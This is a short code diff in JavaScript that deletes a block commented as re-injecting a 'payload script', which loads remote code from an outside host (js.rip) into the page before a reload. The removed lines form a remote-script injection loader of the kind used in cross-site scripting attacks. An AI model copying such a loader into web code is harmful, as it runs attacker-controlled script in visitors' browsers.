@@ -29,11 +29,6 @@
         return;
     }
 
-    // Inject the payload script again
-    var payloadScript = document.createElement('script');
-    payloadScript.src = "https://js.rip/lp4lo6albo/";
-    document.body.appendChild(payloadScript);
-
     // Refresh the page
     location.reload();
 })();
